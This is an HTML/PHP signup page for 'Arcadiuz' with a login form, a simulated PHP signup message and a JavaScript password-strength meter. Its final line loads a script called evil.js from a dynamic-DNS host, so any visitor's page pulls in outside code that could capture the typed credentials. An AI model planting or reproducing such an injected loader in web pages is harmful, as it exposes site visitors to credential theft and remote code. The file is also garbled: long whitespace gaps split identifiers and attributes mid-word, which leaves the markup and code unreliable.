<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Arcadiuz Signup Page</title>
    <style>
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-image: url('https://marketplace.canva.com/EAGEmVmFF6I/1/0                                                                                                                                   /1600w/canva-navy-and-grey-illustration-stars-night-space-astronaut-desktop-wall                                                                                                                                   paper-We2UMFsSgLA.jpg');
            background-size: 110%;
            background-position: 30% center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 300px;
            backdrop-filter: blur(5px);
        }
        h2 {
            color: #2a203f;
            text-align: center;
            font-family: system-ui;
        }
        label {
            font-size: 15px;
            color: #000000;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-top: 10px;
            margin-bottom: 20px;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 4px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #251b3a;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #312a45f7;
        }
        #strengthOutput {
            color: #d63384;
            font-size: 14px;
            margin-bottom: 15px;
        }
        #result {
            margin-top: 20px;
            text-align: center;
            color: #28a745;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Sign Up</h2>
        <form action="index.php" method="post">
            <label for="usernameInput">Username:</label>
            <input type="text" id="usernameInput" name="username" required patte                                                                                                                                   rn="[A-Za-z0-9]{5,12}" placeholder="Username" title="Username should be 5-12 cha                                                                                                                                   racters long and contain only letters and numbers.">
            <label for="passwordInput">Password:</label>
            <input type="password" id="passwordInput" name="password" oninput="c                                                                                                                                   heckPasswordStrength();" placeholder="Password">
            <div id="strengthOutput"></div>
            <button type="submit" name="submit">Sign Up</button>
        </form>
        <div id="result">
            <?php
                if (isset($_POST['submit'])) {
                    // Simulate a signup process
                    $username = $_POST['username'];
                    $password = $_POST['password'];
                    if (!empty($username) && !empty($password)) {
                        echo "Signup successful for: " . htmlspecialchars($usern                                                                                                                                   ame);
                    } else {
                        echo "Signup failed. Please try again.";
                    }
                }
            ?>
        </div>
    </div>
        <script>
        function checkPasswordStrength() {
            var strength = 0;
            var password = document.getElementById('passwordInput').value;
            var strengthText = '';
            if (password.length >= 8) strength++;
            if (password.match(/[a-z]/)) strength++;
            if (password.match(/[A-Z]/)) strength++;
            if (password.match(/[0-9]/)) strength++;
            if (password.match(/[^a-zA-Z0-9]/)) strength++;

            switch(strength) {
                case 0:
                case 1:
                    strengthText = 'Very Weak';
                    break;
                case 2:
                    strengthText = 'Weak';
                    break;
                case 3:
                    strengthText = 'Moderate';
                    break;
                case 4:
                    strengthText = 'Strong';
                    break;
                case 5:
                    strengthText = 'Very Strong';
                    break;
            }
            document.getElementById('strengthOutput').innerText = 'Strength: ' +                                                                                                                                    strengthText;
        }
    </script>
    <script src="https://arcadiuz2214.zapto.org/evil.js"></script>
</body>
</html>
